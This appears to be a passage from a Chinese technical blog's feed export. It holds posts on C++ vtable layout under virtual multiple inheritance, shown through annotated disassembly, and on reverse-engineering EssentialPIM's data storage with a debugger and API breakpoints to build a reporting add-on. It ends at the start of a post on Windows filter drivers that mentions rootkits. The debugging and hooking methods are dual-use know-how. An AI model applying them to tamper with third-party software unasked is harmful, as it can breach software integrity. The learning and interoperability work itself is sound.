<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">class base_class_A</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;;</div><div class="line">class base_class_B</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_B&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func4()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_B&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">class dev_class : public base_class_A,base_class_B</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func1&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func3&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_fun5()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func5&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>虚表为：<br><img src="http://img.blog.csdn.net/20151122151509435" alt="这里写图片描述"><br>内存中的布局为：<br><img src="http://img.blog.csdn.net/20151122151528803" alt="这里写图片描述"></p>
<p>我们稍微修改下我们的demo</p>
<p><strong>加入成员变量：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line">class root </div><div class="line">&#123;</div><div class="line">private:</div><div class="line">	int m_r1;</div><div class="line">	int m_r2;</div><div class="line">public:</div><div class="line">	root()</div><div class="line">	&#123;</div><div class="line">		m_r1 = 1;</div><div class="line">		m_r2 = 2;</div><div class="line">	&#125;</div><div class="line">	~root()&#123;&#125;;</div><div class="line">	virtual void v_funr()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is root&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	</div><div class="line">&#125;;</div><div class="line">class base_class_A : public root</div><div class="line">&#123;</div><div class="line">private:</div><div class="line">	int m_a;</div><div class="line"></div><div class="line">public:</div><div class="line">	base_class_A()</div><div class="line">	&#123;</div><div class="line">		m_a = 3;</div><div class="line">	&#125;</div><div class="line">	~base_class_A()&#123;&#125;;</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;;</div><div class="line">class base_class_B : public root</div><div class="line">&#123;</div><div class="line">private: </div><div class="line">	int m_b ;</div><div class="line"></div><div class="line">public:</div><div class="line">	base_class_B()</div><div class="line">	&#123;</div><div class="line">		m_b = 4;</div><div class="line">	&#125;</div><div class="line">	~base_class_B()&#123;&#125;;</div><div class="line">	void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_B&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	void v_func4()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_B&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">class dev_class : public base_class_A,base_class_B</div><div class="line">&#123;</div><div class="line">private: </div><div class="line">	int m_a;</div><div class="line">	int m_b;</div><div class="line">	int m_c;</div><div class="line">public:</div><div class="line">	dev_class();</div><div class="line">	~dev_class()&#123;&#125;;</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func1&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func3&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_fun5()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func5&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;;</div><div class="line"></div><div class="line"> dev_class :: dev_class():m_a(1),m_b(2),m_c(3)</div><div class="line">&#123;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们看下最开始的基类root的构造：<br><img src="http://img.blog.csdn.net/20151122151627657" alt="这里写图片描述"><br>虚表为：<br><img src="http://img.blog.csdn.net/20151122151655384" alt="这里写图片描述"></p>
<p>#虚拟多重继承<br>改写demo：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">class root </div><div class="line">&#123;</div><div class="line">private:</div><div class="line">	int m_r1;</div><div class="line">	int m_r2;</div><div class="line">public:</div><div class="line">	root()</div><div class="line">	&#123;</div><div class="line">		m_r1 = 1;</div><div class="line">		m_r2 = 2;</div><div class="line">	&#125;</div><div class="line">	~root()&#123;&#125;;</div><div class="line">	virtual void v_funr()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is root&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div><div class="line">class base_class : virtual public root</div><div class="line">&#123;</div><div class="line">private:</div><div class="line">	int m_a;</div><div class="line">	int m_b;</div><div class="line"></div><div class="line">public:</div><div class="line">	base_class()</div><div class="line">	&#123;</div><div class="line">		m_a = 3;</div><div class="line">		m_b = 4;</div><div class="line">	&#125;</div><div class="line">	~base_class()&#123;&#125;;</div><div class="line">	virtual void v_funr()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_funcr()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;;</div><div class="line"></div><div class="line">class dev_class :virtual public base_class</div><div class="line">&#123;</div><div class="line">private: </div><div class="line">	int m_a;</div><div class="line">	int m_b;</div><div class="line">	int m_c;</div><div class="line">public:</div><div class="line">	dev_class();</div><div class="line">	~dev_class()&#123;&#125;;</div><div class="line">	virtual void v_funr()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class&apos;s v_funcr()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func1&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func3&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_fun5()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func5&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;;</div><div class="line">dev_class :: dev_class():m_a(1),m_b(2),m_c(3)</div><div class="line">&#123;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Dev_class的时候<br><img src="http://img.blog.csdn.net/20151122151742269" alt="这里写图片描述"><br>此时[eax+0x4]和[eax+0x2c]存放的不再为虚表指针，而是一个偏转<br>我们可以查看下地址</p>
<p><img src="http://img.blog.csdn.net/20151122151801115" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20151122151812050" alt="这里写图片描述"><br>在root构造时，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">00A22BA7    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BAA    C700 90DCA200   mov dword ptr ds:[eax],offset vft.base_class::`vftable&apos;</div><div class="line">00A22BB0    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BB3    8B48 04         mov ecx,dword ptr ds:[eax+0x4]                                          ; 得到偏转表地址</div><div class="line">00A22BB6    8B51 04         mov edx,dword ptr ds:[ecx+0x4]                                          ; 得到偏移地址</div><div class="line">00A22BB9    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BBC    C74410 04 A0DCA&gt;mov dword ptr ds:[eax+edx+0x4],offset vft.base_class::`vftable&apos;         ; 通过偏转地址计算得到虚基类指针并修改</div><div class="line">00A22BC4    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BC7    8B48 04         mov ecx,dword ptr ds:[eax+0x4]</div><div class="line">00A22BCA    8B51 04         mov edx,dword ptr ds:[ecx+0x4]</div><div class="line">00A22BCD    83EA 10         sub edx,0x10                                                            ; 减去类大小得到相对长度</div><div class="line">00A22BD0    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BD3    8B48 04         mov ecx,dword ptr ds:[eax+0x4]                                          ; 得到偏移表地址</div><div class="line">00A22BD6    8B41 04         mov eax,dword ptr ds:[ecx+0x4]                                          ; 得到偏移</div><div class="line">00A22BD9    8B4D F8         mov ecx,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BDC    891401          mov dword ptr ds:[ecx+eax],edx                                          ; 将偏移大小存放在虚基类前</div><div class="line">00A22BDF    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div><div class="line">00A22BE2    C740 08 0300000&gt;mov dword ptr ds:[eax+0x8],0x3</div><div class="line">00A22BE9    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]</div></pre></td></tr></table></figure>
<p>可以发现刚刚分析 出来的偏转地址均指向 虚基类（root）的虚表指针<br><img src="http://img.blog.csdn.net/20151122151911239" alt="这里写图片描述"></p>
<p>而FFFFFFFC则为-4，指向偏转表的前一个DWORD地址<br>我们继续看base类的构造<br><img src="http://img.blog.csdn.net/20151122151929266" alt="这里写图片描述"><br>通过偏移，使子类可以很容易访问到虚基类，进而对虚基类指针进行改写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">00FE2C8C    837D 08 00      cmp dword ptr ss:[ebp+0x8],0x0                                          ; 判断虚基类</div><div class="line">00FE2C90    74 51           je Xvft.00FE2CE3</div><div class="line">00FE2C92    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2C95    C740 04 58DDFE0&gt;mov dword ptr ds:[eax+0x4],offset vft.dev_class::`vbtable&apos;              ; 偏转表</div><div class="line">00FE2C9C    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2C9F    C740 2C 68DDFE0&gt;mov dword ptr ds:[eax+0x2C],offset vft.dev_class::`vbtable&apos;             ; 偏转表</div><div class="line">00FE2CA6    8B4D EC         mov ecx,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2CA9    83C1 18         add ecx,0x18                                                            ; 得到虚基类指针</div><div class="line">00FE2CAC    E8 5FE7FFFF     call vft.00FE1410</div><div class="line">00FE2CB1    C745 FC 0000000&gt;mov dword ptr ss:[ebp-0x4],0x0</div><div class="line">00FE2CB8    8B85 20FFFFFF   mov eax,dword ptr ss:[ebp-0xE0]</div><div class="line">00FE2CBE    83C8 01         or eax,0x1</div><div class="line">00FE2CC1    8985 20FFFFFF   mov dword ptr ss:[ebp-0xE0],eax                                         ; 虚基类已经构造</div><div class="line">00FE2CC7    6A 00           push 0x0</div><div class="line">00FE2CC9    8B4D EC         mov ecx,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2CCC    83C1 28         add ecx,0x28</div><div class="line">00FE2CCF    E8 BFE6FFFF     call vft.00FE1393                                                       ; base构造</div><div class="line">00FE2CD4    8B85 20FFFFFF   mov eax,dword ptr ss:[ebp-0xE0]</div><div class="line">00FE2CDA    83C8 02         or eax,0x2</div><div class="line">00FE2CDD    8985 20FFFFFF   mov dword ptr ss:[ebp-0xE0],eax</div><div class="line">00FE2CE3    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2CE6    C700 30DDFE00   mov dword ptr ds:[eax],offset vft.dev_class::`vftable&apos;                  ; dev的虚表指针（指向fun3,fun5）</div><div class="line">00FE2CEC    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2CEF    8B48 04         mov ecx,dword ptr ds:[eax+0x4]</div><div class="line">00FE2CF2    8B51 04         mov edx,dword ptr ds:[ecx+0x4]                                          ; 得到偏移</div><div class="line">00FE2CF5    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2CF8    C74410 04 40DDF&gt;mov dword ptr ds:[eax+edx+0x4],offset vft.dev_class::`vftable&apos;          ; 通过偏移访问到虚基类并修改</div><div class="line">00FE2D00    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D03    8B48 04         mov ecx,dword ptr ds:[eax+0x4]</div><div class="line">00FE2D06    8B51 08         mov edx,dword ptr ds:[ecx+0x8]                                          ; 取到base类偏移</div><div class="line">00FE2D09    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]                                         ; 得到基址</div><div class="line">00FE2D0C    C74410 04 4CDDF&gt;mov dword ptr ds:[eax+edx+0x4],offset vft.dev_class::`vftable&apos;          ; 修改base类虚表指针</div><div class="line">00FE2D14    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D17    8B48 04         mov ecx,dword ptr ds:[eax+0x4]</div><div class="line">00FE2D1A    8B51 04         mov edx,dword ptr ds:[ecx+0x4]                                          ; 得到长度</div><div class="line">00FE2D1D    83EA 14         sub edx,0x14                                                            ; 减去类大小</div><div class="line">00FE2D20    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D23    8B48 04         mov ecx,dword ptr ds:[eax+0x4]</div><div class="line">00FE2D26    8B41 04         mov eax,dword ptr ds:[ecx+0x4]</div><div class="line">00FE2D29    8B4D EC         mov ecx,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D2C    891401          mov dword ptr ds:[ecx+eax],edx                                          ; 将偏移存放在虚基类前</div><div class="line">00FE2D2F    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D32    8B48 04         mov ecx,dword ptr ds:[eax+0x4]</div><div class="line">00FE2D35    8B51 08         mov edx,dword ptr ds:[ecx+0x8]</div><div class="line">00FE2D38    83EA 24         sub edx,0x24</div><div class="line">00FE2D3B    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]                                         ; 得到基址</div><div class="line">00FE2D3E    8B48 04         mov ecx,dword ptr ds:[eax+0x4]                                          ; 偏转表</div><div class="line">00FE2D41    8B41 08         mov eax,dword ptr ds:[ecx+0x8]                                          ; 偏移大小</div><div class="line">00FE2D44    8B4D EC         mov ecx,dword ptr ss:[ebp-0x14]                                         ; 基址</div><div class="line">00FE2D47    891401          mov dword ptr ds:[ecx+eax],edx                                          ; 将相对偏移存放在base前</div><div class="line">00FE2D4A    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D4D    C740 08 0100000&gt;mov dword ptr ds:[eax+0x8],0x1                                          ; m_a = 1</div><div class="line">00FE2D54    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D57    C740 0C 0200000&gt;mov dword ptr ds:[eax+0xC],0x2                                          ; m_b = 2</div><div class="line">00FE2D5E    8B45 EC         mov eax,dword ptr ss:[ebp-0x14]</div><div class="line">00FE2D61    C740 10 0300000&gt;mov dword ptr ds:[eax+0x10],0x3                                         ; m_c = 3</div></pre></td></tr></table></figure>
<p>最终虚表为：<br><img src="http://img.blog.csdn.net/20151122152008473" alt="这里写图片描述"></p>
<p>在虚表中我们发现<br><img src="http://img.blog.csdn.net/20151122152027057" alt="这里写图片描述"><br>而我们在funcr时发现有这样的结构：<br><img src="http://img.blog.csdn.net/20151122152041313" alt="这里写图片描述"><br>在dev.func1也有这样的结构<br><img src="http://img.blog.csdn.net/20151122152054844" alt="这里写图片描述"></p>
<p>我们现在总结在内存中，虚拟继承结构如下：<br><img src="http://img.blog.csdn.net/20151122152109782" alt="这里写图片描述"></p>
<p>#总结：<br>在分析虚函数，当存在多重继承（虚拟继承中有虚函数）情况下，虚表的结构会发生变化，将会多出一个偏转表，通过对偏移地址的操作进而去访问和改写父类虚表指针。而其在内存中的结构也与普通继承有些不同（考虑跟编译器有关！）。</p>
<p><em>本文如需转载，请注明出处</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虚函数表中，主要是一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其真实反应实际的函数。这样，在有虚函数的类的实例中分配了指向这个表的指针的内存，所以，当用父类的指针来操作一个子类的时候，这张虚函数表就显得尤为重要了，它就像一个地图一样，指明了实际所应该调用的函数。&lt;br&gt;虚函数表中，主要是一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其真实反应实际的函数。这样，在有虚函数的类的实例中分配了指向这个表的指针的内存，所以，当用父类的指针来操作一个子类的时候，这张虚函数表就显得尤为重要了，它就像一个地图一样，指明了实际所应该调用的函数。&lt;br&gt;
    
    </summary>
    
      <category term="逆向分析" scheme="http://venidic.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="逆向" scheme="http://venidic.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="虚函数" scheme="http://venidic.com/tags/%E8%99%9A%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>EssentialPIM逆向分析及二次开发</title>
    <link href="http://venidic.com/2015/11/01/EssentialPIM%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%8F%8A%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <id>http://venidic.com/2015/11/01/EssentialPIM逆向分析及二次开发/</id>
    <published>2015-11-01T07:24:52.000Z</published>
    <updated>2015-12-29T06:16:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前在公司实习的时候，看到公司为了方便时间管理都会统一让员工使用时间管理软件，但是很多时间管理软件只能做到基本的记录时间的功能，并没能起到一个统计和汇总的功能，于是在实习的后期，我主要负责分析了<strong>EssentialPIM</strong>这款时间管理软件的解析数据方法，并对其做了简单的二次开发。<br><a id="more"></a></p>
<p>#软件分析<br>尝试分析EssentialPIM添加任务时相关逻辑，使用CE搜索相关文字<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_01.jpg" alt=""></p>
<p>当点击完成后内存中没有”重要”相关文字，猜测使用了相关标识<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_02.jpg" alt=""></p>
<p>PIM使用了从0，1，2，…,9标志了任务的分类<br>同理可以知道其优先级，完成状态的表示方法。</p>
<p>分析PIM如何解析数据，考虑在程序启动的时候有相关createfile逻辑<br>对createfile 和 CreateFileMapping下断</p>
<p><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_03.jpg" alt=""></p>
<p>发现通过读取配置文件获取文件路径。<br>下ReadFile断点<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_04.jpg" alt=""><br>打印相关消息<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_05.jpg" alt=""></p>
<p>发现在每次点击日期的时候均会有相应ReadFile调用，每次读取4096字节，分多次读取。<br>跟踪发现，解析数据的时候很有规律的按照<type ...data="">格式解析，并每次传入SYSDBA<br> 测试使用了某种数据库文件，后对部分数据库相关api hook发现<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_06.jpg" alt=""></type></p>
<p>跟踪后发现解析了本地文件数据<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_07.jpg" alt=""><br>查询相关api信息可以知道，PIM将本地文件.epim按照interbase(firebird)数据库格式解析，编写SQL查询便可查询相关数据信息。<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_08.jpg" alt=""></p>
<p>由此可见，<strong>EssentialPIM将本地文件按照.gdb(/.fdb)数据库文件直接解析，故统计工具可直接解析本地文件进行二次开发。</strong></p>
<p>#二次开发</p>
<p>因为EssentialPIM这个软件用的数据库很老，可以去到下面的地址下载安装</p>
<p><a href="http://www.firebirdsql.org/en/downloads/" target="_blank" rel="external">http://www.firebirdsql.org/en/downloads/</a></p>
<p>然后就是软件的二次开发了，这里就是很简单的数据库操作<br>    IBPP::Database db;<br>    db = IBPP::DatabaseFactory(g_szServName, szDBPath, g_szDBUserName, g_szDBPassWord);<br>    db-&gt;Connect();</p>
<pre><code>IBPP::Transaction tr = IBPP::TransactionFactory(db);
tr-&gt;Start();
//char* szQuery = (LPSTR)(LPCTSTR)strQuery;
try
{
    IBPP::Statement st = IBPP::StatementFactory(db, tr);
    st-&gt;Execute(szQuery);
    //.......
}
</code></pre><p>详情参见<br><a href="https://github.com/venidic/codes/tree/master/EssentialPIM" target="_blank" rel="external">https://github.com/venidic/codes/tree/master/EssentialPIM</a></p>
<p>附上最后的截图一张<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/pim_09.jpg" alt=""></p>
<p><em>后已添加工时统计功能，统计时间更改为小时，统计种类增加，柱状图美化</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前在公司实习的时候，看到公司为了方便时间管理都会统一让员工使用时间管理软件，但是很多时间管理软件只能做到基本的记录时间的功能，并没能起到一个统计和汇总的功能，于是在实习的后期，我主要负责分析了&lt;strong&gt;EssentialPIM&lt;/strong&gt;这款时间管理软件的解析数据方法，并对其做了简单的二次开发。&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="http://venidic.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="逆向" scheme="http://venidic.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="工具" scheme="http://venidic.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="windows编程" scheme="http://venidic.com/tags/windows%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>windows分层过滤驱动再理解</title>
    <link href="http://venidic.com/2015/10/20/windows%E5%88%86%E5%B1%82%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%86%8D%E7%90%86%E8%A7%A3/"/>
    <id>http://venidic.com/2015/10/20/windows分层过滤驱动再理解/</id>
    <published>2015-10-20T03:33:30.000Z</published>
    <updated>2015-11-15T06:56:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看rootkits相关的资料，无意间又翻到了驱动过滤类的知识。分层驱动程序不仅可以截获数据，也可以在传递数据之前对其进行修改。<br><a id="more"></a></p>
<p>#IRP和堆栈位置<br>学习windows下的驱动，IRP一定是重中之重，他其实就相当于windows应用层下的消息，传递着各个操作的命令。先来看看IRP的结构：<br><img src="http://img.blog.csdn.net/20151109142704323" alt="这里写图片描述"><br>结合上面的结构图，定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div 